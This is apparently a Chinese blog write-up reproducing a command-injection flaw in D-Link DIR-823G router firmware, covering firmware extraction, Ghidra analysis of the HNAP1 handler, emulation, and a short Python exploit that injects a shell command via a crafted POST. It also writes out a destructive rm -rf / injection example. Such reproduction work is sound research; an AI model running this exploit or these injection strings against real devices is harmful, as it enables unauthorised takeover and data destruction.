#  路由器安全研究｜D- Link DIR-823G v1.02 B05 复现与利用思路  
 蚁景网安   2026-01-29 09:23  
  
## 前言  
  
D-Link DIR-823G v1.02 B05存在命令注入漏洞，攻击者可以通过POST的方式往 /HNAP1发送精心构造的请求，执行任意的操作系统命令  
## 漏洞分析  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOuib4zhvQoF5garj1dJSkxt3FBgibuQtrvhXp8W16t24OsAWCqqz2Iibcmg/640?wx_fmt=other&from=appmsg "")  
  
binwalk提取固件，成功获取到固件  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOuORbYcUpBNobzMPKF5a4pDJdXrMmAS1xS4tapqr6RSrvmS6F8GgqYhg/640?wx_fmt=other&from=appmsg "")  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOuhLESPGftJUF9vJy3HPYBhZqdefU2fsLWKBXyQyI7EdPaibsE3UpJGyg/640?wx_fmt=other&from=appmsg "")  
  
现在我们已经进入到应用里了，那么我们在进行分析固件的时候，应该怎么去分析这个情况？首先，我们去分析别人的漏洞，别人是会告诉哪里会出现问题。但是我们现在假设我们是分析一个未知固件，我们就得先知道这个固件有哪些应用，启动了哪些服务，最清晰和简便的方式就是去看我们etc文件下面，里面有个叫init.d的目录，里面是关于启动项的内容  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOuWD5FlNf0R09IGyMFsN1V2ictdZcv9pfiaZyyDbQTmO1vw96Jyp0wxPEg/640?wx_fmt=other&from=appmsg "")  
  
我们首先来看rcS下面的内容 vim rcS  
  
首先是设置ip，然后挂载了两个文件系统分别是proc，这是与进程相关的文件系统，包括当前进程启动存放在哪个地址  
  
还有ramfs文件系统，根据以前的笔记，可知ramfs文件系统跟RAM相关  
  
然后下面就是判断是否还有挂载别的文件系统  
  
然后mkdir就是创建各种各样的文件夹，都有对应的功能，比如说创建了pptp文件夹，针对拨号上网的功能，然后还有smbd服务，可以看到创建了一个usb的文件夹，说明该固件有可以跟usb也就是U盘相关的操作，接下来都是一些配置信息  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOuxJ96qm4EhXLkHWuH9COeGRrpqwv5QvyduMVuaQPNbA00MJxZgoMTzQ/640?wx_fmt=other&from=appmsg "")  
  
继续往下翻  
  
可以看到该固件启动了web server的web服务，也就是httpd的内容，这里启动的是goahead，通过这个名字，我们可以确定web服务就是goahead，如果想要分析web服务的话，就直接分析goahead就可以  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOuYgCDQ6n0CAolvicjoP0C0K8SSsZ2kshRCJUbN8q0ZhR7PJzcA8LGNhA/640?wx_fmt=other&from=appmsg "")  
  
我们回到squashfs-root目录下，搜索goahead的一些简单情况  
```
grep -ir "goahead".
```  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOuTPXDEfSNKrXWdPf1frFYibibAxC9pHZzibTauwqMoXiaMJiaXf5nw67bbpQ/640?wx_fmt=other&from=appmsg "")  
  
最下面是两个启动项的内容，可以忽略，然后第一行是bin的可执行应用，这个其实就是我们最后分析的内容  
  
那如何分析呢？它是一个HNAP1请求，那就可以去检索我们的HANP1请求  
```
grep -ir "HNAP1".
```  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOuK0XVXuL9K0HA9h9yT766ZueQxsvtibHS0w7EAhCvlHc88rFa0bbEC6Q/640?wx_fmt=other&from=appmsg "")  
  
可以看到它检索到一些js代码，js代码对我们来说一般，(比较我们是找二进制相关的漏洞)  
  
但是，我们可以发现它匹配了一个二进制程序，也就是goahead  
  
这里我们先科普一下goahead的一些情况:  
  
GoAhead ，它是一个源码,免费、功能强大、可以在多个平台运行的嵌入式WebServer  
  
goahead的websUrlHandlerDefine函数允许用户自定义不同url的处理函数  
  
它在进行编写与它相关的请求，是通过websUrlHandlerDefine来确定的  
```
websUrlHandlerDefine(T("/HNAP1")，NULL,0, websHNAPHandler,0);
websUrlHandlerDefine(T("/goform")，NULL,0, websFormHandler,0);
websUrlHandlerDefine(T("/cgi.bin")，NULL,0, websCgiHandler,0);
```  
  
使用ghidra进行逆向分析，goahead二进制文件在squashfs-root目录下的bin目录下  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOukQUP13g6JhHryD6s8es06kbOOYIOMZyqenbRQnAyG1cIiaWyFp8moVA/640?wx_fmt=other&from=appmsg "")  
  
那进入到goahead反编译界面该如何分析呢？一种是找到main函数去进行分析，比较耗时  
  
一种是通过关键字来搜索，反推调用情况，来推测每个功能的解析情况 ctrl+shift+E  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOuOHOsx5J7yRwM5WWBlFrbjx08icwLhEW4JslA0JjYANlWfGnOlnFiaNkg/640?wx_fmt=other&from=appmsg "")  
  
匹配成功，停在指定区域  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOuJlvFmeHibJTL6gVBVdYNCsmfMER2fCiadxkxf3cqPdg8hrrc6q3Cp6yA/640?wx_fmt=other&from=appmsg "")  
  
但是它所对应的反编译代码还是很多的，所以我们可以通过反编译出来的函数名，进行查看它的调用关系  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOu1OFsmDbe4KOibibgiarQ3DQDDuIMIQkXrmD8gjGAvycvXTkE2e2IQOqicg/640?wx_fmt=other&from=appmsg "")  
  
一路往下翻，终于找到我们所要的东西  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOufU4PGhJXEzo8iaia90icpTsx0bWKa4klPqwsgLwRiaxwj0fR6vtbbIQKDQ/640?wx_fmt=other&from=appmsg "")  
  
而且我们看到，这个函数继续往上调的话就是main函数了，所以其实一开始也是可以从main函数来分析的(0.0)  
  
所以现在我们可以重点来分析这个函数  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOuJvKPXv8DSQYviaYsmvaHsjMYM0861piciacIFrLggBddLmZVzkEicPehvw/640?wx_fmt=other&from=appmsg "")  
  
前面还是做一些判断，然后请求还有不止HNAP1，对应的都是一个函数。  
  
同一个函数做的事情，类似于websUrlHandlerDefine这个函数，那HANP1对应的函数是  
  
FUN_0042383c，那就双击进去看看  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOuBoNjXlLYPxd3EvEsvut4NupDib7Ic36p7k4B3rmXBrlrBuOic8jDIq2A/640?wx_fmt=other&from=appmsg "")  
  
这里就是漏洞点，这里执行了memset和snprintf，一般来说这里应该是不存在漏洞点，但是下面一条语句是system，也就是把格式化化的字符串直接就拿到了system函数作为参数传递进去，而snprintf这里的参数有个echo，有个单引号问题  
  
比如说正常代码  
```
#!/bin/bash
read -p "Enter your name: " name
echo 'Hello, '$name'!'
```  
  
攻击步骤  
：  
  
正常输入  
：用户输入 Alice  
，输出：  
```
Hello,Alice!
```  
  
恶意输入  
：用户输入 '$(id)'  
，此时脚本实际执行的命令变为：  
```
echo 'Hello, ''$(id)'!'
```  
  
输出：  
```
Hello, $(id)!
```  
  
单引号内的 $(id)  
 不会被执行  
，暂时安全。  
  
更危险的输入  
：用户输入 ' && rm -rf / #  
，命令变为：  
```
echo 'Hello, '' && rm -rf / #'!
```  
  
此时，第一个单引号被用户输入的 '  
 闭合。&& rm -rf /  
 成为独立命令，在 echo  
 之后执行。#  
 注释掉后续的 '!  
，避免语法错误。  
  
那么会导致rm -rf /  
 会被执行，删除系统文件！  
  
所以，如果我们构造一些恶意的代码写入到snprintf中，再传递到system函数，就会造成命令注入漏洞  
  
但是我们要进到漏洞点的话，还需要满足函数上面的一些要求  
  
所以我们得符合上面函数的一些限制才能进入到漏洞点来，这里先取了PTRs_SetMultipleActions_00588d80的首地址，赋值给DAT_0058a6c4，然后DAT_0058a6c4自身判断和自加2来进行循环判断，用strstr函数查找DAT_0058a6c4在param  
+0x524中出现的位置，并赋值给pcVar1，如果pcVar1的值不为0的话，就会进入到我们的漏洞点来  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOu26zSRqoKA9KAGEU8Xibr7IicHibBVCiclRTzicotj9jeaW29bkvLG0y3wibg/640?wx_fmt=other&from=appmsg "")  
  
DAT_0058a6c4与PTR_s_SetMultipleActions_00588d80相关，双击进去看看  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOu3XycsE7JeM79fCe1EGBJkbyl94zF5ubvfCrmaoyB7NGjiaqRbTqv1Sg/640?wx_fmt=other&from=appmsg "")  
  
可以看到里面都是它对应的一些方法，比如说SetMultipleActions之类的  
## 固件模拟  
  
分析到这里，基本上是明朗了，接下来就要进行固件模拟操作，使用firmadyne模拟固件启动  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOu2zZaHGPfRBO9lnlpVq1TU3Sa4DkKO04IITKJ74sOvkTZMjNGfuwrOQ/640?wx_fmt=other&from=appmsg "")  
```
sudo ./DIR823G_V1.0.2B05_20181207.sh
```  
  
然后firmadyne默认的密码就是firmadyne  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOu0kCMIjYs1wjaX3bQWQOrvjQA7toKnzwIialyH5BPJIpdx3tsNibSxQ1A/640?wx_fmt=other&from=appmsg "")  
  
得等一段时间，然后192.168.0.1  
  
但是这个一直搞不定，模拟不起来，也不知道是什么原因，排查不出  
  
然后换成了firmware analysis plus (fap)这个框架，就模拟起来了  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOufK1nVHokO5I5UsCKU09S63mkPxJSbojWLb61P1PxSySnUxRULqUiaOg/640?wx_fmt=other&from=appmsg "")  
  
等一段时间后，回车，就可以模拟起来了，输入192.168.0.1  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOubGUOU98BPMyjVlPN0BIATt4QjYemeianibS6TSe7WnXwV3KtDmqCGxhA/640?wx_fmt=other&from=appmsg "")  
  
进入向导，随便输入点东西  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOuX0CqRj5hFrDUic3P0uNZT63y5ELYEtkhbzSBzazHYQNYytWIicsPaeQw/640?wx_fmt=other&from=appmsg "")  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOupwaQ05y4gdUhicVOxCTm57dpNicboT8J7iakAGv5JLcNiaC7dwCFaVD0aQ/640?wx_fmt=other&from=appmsg "")  
  
密码8位，输入12345678  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOuTsacHlYvM5Cnic6oJ6xzXx8icrw4UMlpMgCSjAueAWWrMJ6Qld2T8c2w/640?wx_fmt=other&from=appmsg "")  
  
然后就开始配置一些内容，同时可以注意到左侧已经把一些数据写入到关键的文件夹中  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOub7TdS6wq3qNQM6nosT6XeumwRDwMqA5nib64w1Umdia3hN5BNj70I09A/640?wx_fmt=other&from=appmsg "")  
  
配置完毕，登录，成功进入路由器  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOuVAJ1sry4sia4RQJsmoEYUKJX3pRBTRyh49kvj6ibqroe7rDzOfuOrwcQ/640?wx_fmt=other&from=appmsg "")  
## exp编写  
```
#!/usr/bin/env python
#-*- coding:utf-8 -*-

import requests

ip='192.168.0.1'

command="'`echo aaaaaaaaa > /web_mtn/test.txt`'"
length=len(command)

headers=requests.utils.default_headers()
headers["Content-Length"]=str(length)
headers["User-Agent"]="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"
headers["SOAPAction"]='"http://purenetworks.com/HNAP1/GetClientInfo"'
headers["Content-Type"]="text/xml; charset=UTF-8"
headers["Accept"]="*/*"
headers["Accept-Encoding"]="gzip, deflate"
headers["Accept-Language"]="zh-CN,zh;q=0.9,en;q=0.8"

payload=command
r=requests.post('http://'+ip+'/HNAP1/', headers=headers, data=payload)
```  
  
因为是http请求，所以我们使用requests，然后设置ip，设置命令，构造报头，最后post请求将HNAP1，headers和payload都传过去  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOuZnCS9I8UibYHdgondd9VdvmiaPCghA7Qso4ahKEuPalFYrleH0nEgb4A/640?wx_fmt=other&from=appmsg "")  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/5znJiaZxqldxiacTJnvC3eT617RDgFUZOuCAtLST22UVtRicjjbES7VgfMGaBg0sibz95phKyzVXU0CADlCbGQe3bg/640?wx_fmt=other&from=appmsg "")  
  
复现完毕，ctrl+a 然后x结束固件模拟  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6iavic0tIJIoZCwKvUYnFFiaibgSm6mrFp1ZjAg4ITRicicuLN88YodIuqtF4DcUs9sruBa0bFLtX59lQQ/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=11 "")  
  
学  
习  
网安实战课程  
，  
戳  
“阅读原文”  
  
  
